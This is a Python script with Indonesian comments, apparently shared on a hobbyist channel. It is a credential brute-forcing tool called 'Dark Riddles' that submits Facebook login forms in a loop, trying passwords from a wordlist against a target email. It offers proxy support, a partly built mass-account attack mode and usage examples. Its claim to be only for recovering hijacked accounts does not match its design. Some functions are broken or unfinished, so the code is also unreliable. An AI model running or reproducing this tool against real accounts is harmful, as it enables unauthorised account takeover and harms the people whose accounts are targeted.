
"""DILARANG MEMPERJUAL BELIKAN SCRIPT INI TANPA IZIN DARI KAMI
    Copyright (C) Sreetx Allright Reserved"""
import os, sys, time
os.system('cls||clear')

if sys.platform in ["linux", "linux2"]:
    orange = "\033[93m"
    putih = "\033[39m"
    merah = "\033[91m"
    hijau = "\033[92m"
    biru = "\033[94m"
else:
    orange = ""
    putih = ""
    merah = ""
    hijau = ""
    biru = ""

try:
    print('\n [~] Mengimport module, harap tunggu....')
    import socket, sys, urllib, optparse, http
    from http import cookiejar
    from tqdm import tqdm
    import mechanize
    import requests
    print(' [+] Selesai')
except (KeyboardInterrupt, EOFError): print(' [!] Gagal mengimport, proses dibatalkan pengguna');sys.exit()
except ImportError:
    print(merah+' [!] Module yang dibutuhkan tidak lengkap. Menginstall module terlebih dahulu...'+putih);time.sleep(1)
    try:
        os.system('apt install pip')
        os.system('pip install requests tqdm mechanize')
    except: print(' [!] Periksa koneksi internet anda');sys.exit()

def banner(target, wordlist, prxy, masal, emailo, port):
    print(orange+'''
<>=================================================<>
 |                 '''+putih+''' Dark Riddles  '''+orange+'''                 |
 <=================================================>
 | '''+putih+'''Authors: Sreetx'''+orange+'''                                |
 | '''+putih+'''Version: 1.21.73 #Beta'''+orange+'''                           |
 +-------------------------------------------------+
 |'''+putih+'''[INFO]: KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN'''+orange+''' |
 | '''+putih+'''YANG ANDA LAKUKAN'''+orange+'''                               |
 | '''+putih+'''TOOL'S INI HANYA DIGUNAKAN UNTUK MEREBUT KEMBALI'''+orange+'''|
 | '''+putih+'''AKUN FACEBOOK YANG DIBAJAK'''+orange+'''                      |
 +=================================================+
 |                   '''+putih+''' Rincian '''+orange+'''                     |
 ===================================================''')
    if masal:
        print(' | '+hijau+'Wordlist Email:'+biru, emailo,''+orange+'|')
    else: print(' |'+hijau+' Target:'+biru, target,''+orange+'|')
    print(' | '+hijau+'Wordlist Password:'+biru, wordlist,''+orange+'|')
    if prxy:
        print(' | '+hijau+'Proxy: '+biru+'[ON] '+orange+'|')
        print(' | '+hijau+'Proxy yang digunakan: '+biru+str(prxy)+' '+orange+'|')
        print(' | '+hijau+'Port: '+biru+str(port)+orange+'|')
    else:
        print(' | '+hijau+'Proxy: '+merah+'[OFF] '+orange+'|')
        print(' | '+hijau+'Port: '+merah+'[OFF]'+orange+'|')
    if masal:
        print(' | '+hijau+'Hack Masal: '+biru+'[ON] '+orange+'|')
        print(' | '+putih+'File log tidak dapat dibuat! Segera salin semua hasil meretas anda jika anda menemukan akun '+orange+'|')
    else:
        print(' | '+hijau+'Hack Masal: '+merah+'[OFF] '+orange+'|')
    print(''' ===================================================
 |      '''+putih+'''  Brute force attack dijalanakan'''+orange+'''           |
 |   '''+putih+'''  Tekan CTRL+C untuk menghentikan proses  '''+orange+'''    |
<>=================================================<>
'''+putih)
    print(' [!] Peringatan: Mode Hack masal belum bisa digunakan!')

#Browser
br = mechanize.Browser()

def urg():
    cj = cookiejar.LWPCookieJar()
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br._factory.is_html = True
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1636.0 Safari/537.36')]

def proxy(prxy, port):
    print(hijau+' [~] Menyambungkan ke proxy....'+putih)
    try:
        p = {'https':'http://'+str(prxy)+':'+str(port)}
        try:
            r = requests.get('https://www.wikipedia.org', proxies=p, timeout=5)
            if prxyip==p.headers['X-Client-IP']: return True
        except Exception: return False
        print(hijau+' [/] Terhubung'+putih)
    except: print(merah+' [!] Tidak dapat tersambung'+putih)
    
def logmasal(emailo, ps):
    email = (open(emailo).readlines())
    for im in email:
        im = im.strip()
        if len(im) <6:continue
    if prxy:
        proxymain(proxy)
def login(target, p, prxy):
    urg()
    br.open('https://web.facebook.com/?_rdc=1&_rdr')
    br.select_form(nr=0)
    br.form['email'] = target
    br.form['pass'] = p.strip()
    br.method ='POST'
    so = br.submit().geturl()
    if "recover" in so: return 2
    elif "checkpoint" in so:    
        print(orange+'\n \a\a<==================='+'='*len(p.strip())+'==>'+hijau)
        print(' [+] Kombinasi ditemukan!')
        print(' [+] Email:'+biru, target)
        print(hijau+' [+] Password: '+biru, p.decode().strip())
        print(hijau+' [+] Berhasil!')
        print(merah+' [!] Akun terkena checkpoint, Butuh vertifikasi!!!'+putih)
        print(orange+'<==================='+'='*len(p.strip())+'==>'+putih)
        print(' [+] Terima kasih karena telah menggunakan tools kami yang masih dalam pengembangan(beta)'+putih);sys.exit()
        return 1
    
def bantuan():
    banner(target, wordlist, prxy, masal, emailo, port)
    print('''python '''+sys.argv[0]+putih+''' [OPTIONS/COMMAND/PERINTAH]
[Perintah]:
    --u --user     Gunakan ini untuk memasukkan email/nomor telepon target
    --w --wordlist Gunakan ini untuk memasukkan path wordlist baik untuk hack masal ataupun bukan
    --hh           Gunakan ini jika ingin meminta bantuan
    --px --proxy   Gunakan ini jika ingin memakai proxy
    --masal        Gunakan ini jika ingin meretas akun secara masal
    --emr          Gunakan ini untuk memasukkan wordlist email agar hack masal berjalan
[Contoh Penggunaan]:
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt
    python '''+sys.argv[0]+''' --user contoh@gmail.com --w wordlist.txt --proxy 123.45.67:443 --port 8080
    python '''+sys.argv[0]+''' --masal --emr wordlistemail.txt --w wordlist.txt
    python '''+sys.argv[0]+''' --masal --emr wordlistemail.txt --w wordlist.txt --proxy 123.45.67:8080
[INFO]: FILE WORDLIST PASSWORD SUDAH TERSEDIA. JIKA INGIN MENGUBAH FILE WORDLIST, SILAKAN CARI PADA DIRECTORY INI DENGAN NAMA FILE wlf.txt
''');sys.exit()

menu = optparse.OptionParser('\n [?] Belum bisa menggunakan? Ketikan python '+sys.argv[0]+' --hh Untuk meminta bantuan\n')
menu.add_option('--u', '--user', dest='user')
menu.add_option('--w', '--wordlist', dest='wordlist')
menu.add_option('--hh', dest='hlp', action='store_true', default=False)
menu.add_option('--masal', dest='masal', action='store_true', default=False)
menu.add_option('--emr', '--emailriddles', dest='emailo')
menu.add_option('--px', '--proxy', dest='proxy')
menu.add_option('--port', dest='port')

(options, args) = menu.parse_args()
target = options.user
wordlist = options.wordlist
prxy = options.proxy
emailo = options.emailo
masal = options.masal
hlp = options.hlp
port = options.port
if masal:
    banner(target, wordlist, prxy, masal, emailo, port)
    try:
        socket.create_connection((socket.gethostbyname('google.com'), 80), 2)
    except: print(merah+' [!] Harap periksa koneksi internet anda\n'+putih);sys.exit()
    try:
        we = len(list(open(emailo, 'rb')))
    except: print(merah+'\a\a\a [!] File wordlist email tidak tersedia!');print(orange+' [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    try:
        wl = len(list(open(wordlist, 'rb')))
    except: print(merah+'\a\a\a [!] File wordlist password tidak tersedia!');print(orange+' [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    print(hijau+'\n [INFO] Harap tunggu proses sampai wordlist habis jika ingin mendapat akun banyak')
    print('\a [</>] Jumlah wordlist email yang akan dicek:', we)
    print(' [</>] Jumlah wordlist password yang akan dicek:', wl+putih)
    with open(wordlist, 'rb') as loli:
        for ps in tqdm(loli, desc=''+hijau+' [~] Hack masal dijalankan: '+putih+'', total=wl, unit='w'):
            try:
                logmasal(emailo, ps)
            except KeyboardInterrupt: print(merah+' [!] Membatalkan....'+putih);time.sleep(1.5);sys.exit()
            else:
                continue
    print(orange+' [*] Jika anda tidak menemukan satupun akun facebook, harap tambahkan tebakan email dan password pada file wordlist anda\n'+putih);sys.exit()
if hlp:
    bantuan()
if wordlist:
    banner(target, wordlist, prxy, masal, emailo, port)
    try:
        socket.create_connection((socket.gethostbyname('google.com'), 80), 2)
    except: print(merah+' [!] Harap periksa koneksi internet anda\n'+putih);sys.exit()
    if prxy:
        proxy(prxy, port)
    try:
        l = len(list(open(wordlist, 'rb')))
    except: 
        print(merah+' [!] File wordlist tidak ditemukan!')
        print('\a\a\a [/] Harap perhatikan penulisan path wordlist anda\n'+putih);sys.exit()
    print(hijau+'\a [</>] Jumlah wordlist yang akan diuji:'+merah, l)
    print('[~] Brute force dijalankan: '+putih)
    with open(wordlist, 'rb') as crack:
        for p in tqdm(crack, total=l, unit='w'):
            try:
                login(target, p, prxy)
            except KeyboardInterrupt: print(merah+'\n [!] Membatalkan....'+putih);time.sleep(1.5);sys.exit()
            except urllib.error.URLError: print(merah+'\n [!] Gagal koneksi, harap periksa koneksi internet anda'+putih);sys.exit()
            except mechanize._form_controls.ControlNotFoundError: print(merah+" [Error] Nama kontrol web pada script tidak terbaca atau hilang"+putih);sys.exit()
            else:
                pass
    print(merah+'\a\a [*] Proses penebakan selesai')
    print('\a\a\a [!] Password tidak ditemukan, harap tambahkan kata baru pada file wordlist anda\n'+putih);sys.exit()
else:
    print(menu.usage)
#########################################################
#Jangan lupa follow dan ikuti beberapa konten kami ya...#
#Youtube:                                               #
#  https://youtube.com/channel/UCscuxW-ZUViftGyJ9Z1cPbw/#
#Instagram:                                             #
#  https://www.instagram.com/memelucubikin/             #
#########################################################
#Dilarang untuk memperjual belikan script ini tanpa izin#
#Gw buatnya pusing tau!!! Jangan asal jual aja!!!       #
#########################################################
